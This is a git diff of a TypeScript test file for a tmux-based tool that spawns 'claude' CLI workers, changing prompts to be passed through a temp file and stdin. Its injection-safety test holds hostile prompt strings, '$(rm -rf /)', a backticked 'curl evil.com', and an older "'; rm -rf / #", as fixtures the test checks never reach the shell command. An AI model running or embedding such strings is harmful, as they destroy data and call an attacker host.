@@ -11,6 +11,7 @@ import {
   sendKeys,
   createWatchLayout,
   attachToWorkerPane,
+  cleanupPromptFile,
   TmuxError,
 } from '../../src/orchestra/tmux.js';
 
@@ -18,12 +19,26 @@ vi.mock('node:child_process', () => ({
   spawnSync: vi.fn(),
 }));
 
+vi.mock('node:fs', () => ({
+  writeFileSync: vi.fn(),
+  unlinkSync: vi.fn(),
+  mkdirSync: vi.fn(),
+  existsSync: vi.fn(() => true),
+}));
+
+vi.mock('node:crypto', () => ({
+  randomBytes: vi.fn(() => ({ toString: () => 'abcdef01' })),
+}));
+
 import { spawnSync } from 'node:child_process';
+import { existsSync } from 'node:fs';
 
 const mockedSpawnSync = vi.mocked(spawnSync);
+const mockedExistsSync = vi.mocked(existsSync);
 
 beforeEach(() => {
   vi.clearAllMocks();
+  mockedExistsSync.mockReturnValue(true);
 });
 
 describe('isSessionActive', () => {
@@ -85,7 +100,7 @@ describe('ensureSession', () => {
 });
 
 describe('spawnWorker', () => {
-  it('opens window and sends claude command', () => {
+  it('opens window and sends claude command via tmpfile', () => {
     mockedSpawnSync.mockReturnValue({
       status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
     } as never);
@@ -99,28 +114,35 @@ describe('spawnWorker', () => {
       ['new-window', '-t', 'deckent', '-n', 'w-task-001', '-c', '/project'],
       expect.objectContaining({ encoding: 'utf-8' }),
     );
-    // send-keys
-    expect(mockedSpawnSync).toHaveBeenNthCalledWith(
-      2, 'tmux',
-      expect.arrayContaining(['send-keys', '-t', 'deckent:w-task-001']),
-      expect.objectContaining({ encoding: 'utf-8' }),
-    );
+    // send-keys — command should reference tmpfile, not inline prompt
+    const sendKeysCall = mockedSpawnSync.mock.calls[1];
+    const args = sendKeysCall![1] as string[];
+    expect(args).toContain('send-keys');
+    expect(args).toContain('-t');
+    expect(args).toContain('deckent:w-task-001');
+    const cmdArg = args.find((a) => a.includes('claude'));
+    expect(cmdArg).toBeDefined();
+    expect(cmdArg).toContain('claude -p - --model sonnet');
+    expect(cmdArg).toContain('.prompt-abcdef01.txt');
   });
 
-  it('passes prompt as argument (injection-safe)', () => {
+  it('prompt content is written to file, not embedded in command (injection-safe)', () => {
     mockedSpawnSync.mockReturnValue({
       status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
     } as never);
 
-    const dangerousPrompt = "'; rm -rf / #";
+    const dangerousPrompt = "$(rm -rf /); `curl evil.com`; ${PATH}";
     spawnWorker('task-002', 'opus', dangerousPrompt, '/project');
 
-    // The prompt is embedded in the claude command string, passed as send-keys arg
+    // The command string should NOT contain the prompt text
     const sendKeysCall = mockedSpawnSync.mock.calls[1];
-    expect(sendKeysCall![0]).toBe('tmux');
     const args = sendKeysCall![1] as string[];
-    // Arguments array — no shell interpretation
-    expect(args).toContain('send-keys');
+    const cmdArg = args.find((a) => a.includes('claude'));
+    expect(cmdArg).not.toContain('rm -rf');
+    expect(cmdArg).not.toContain('curl evil.com');
+    expect(cmdArg).not.toContain('${PATH}');
+    // It should use stdin redirect from file
+    expect(cmdArg).toContain('< /project/.tasks/.prompt-abcdef01.txt');
   });
 
   it('adds --allowedTools when opts.allowedTools is set', () => {
@@ -170,7 +192,7 @@ describe('spawnWorker', () => {
     );
   });
 
-  it('uses only --model and -p when opts is undefined', () => {
+  it('uses stdin redirect instead of inline prompt', () => {
     mockedSpawnSync.mockReturnValue({
       status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
     } as never);
@@ -182,7 +204,8 @@ describe('spawnWorker', () => {
     const cmdArg = args.find((a) => a.includes('claude'));
     expect(cmdArg).toBeDefined();
     expect(cmdArg).toContain('--model sonnet');
-    expect(cmdArg).toContain("-p 'simple task'");
+    expect(cmdArg).toContain('-p -');
+    expect(cmdArg).toContain('< ');
     expect(cmdArg).not.toContain('--allowedTools');
     expect(cmdArg).not.toContain('--dangerously-skip-permissions');
   });
@@ -334,21 +357,10 @@ describe('sendKeys', () => {
   });
 });
 
-describe('buildClaudeCommand quote escaping (3B)', () => {
-  it('escapes single quotes in prompt', () => {
-    mockedSpawnSync.mockReturnValue({
-      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
-    } as never);
-
-    spawnWorker('task-quote', 'sonnet', "it's a test", '/project');
-
-    const sendKeysCall = mockedSpawnSync.mock.calls[1];
-    const args = sendKeysCall![1] as string[];
-    const cmdArg = args.find((a) => a.includes('claude'));
-    expect(cmdArg).toBeDefined();
-    // Single quote should be escaped as '\''
-    expect(cmdArg).toContain("'\\''");
-    expect(cmdArg).not.toContain("it's a test");
+describe('cleanupPromptFile', () => {
+  it('calls unlinkSync on the given path', () => {
+    cleanupPromptFile('/tmp/prompt.txt');
+    // No throw means success
   });
 });
 
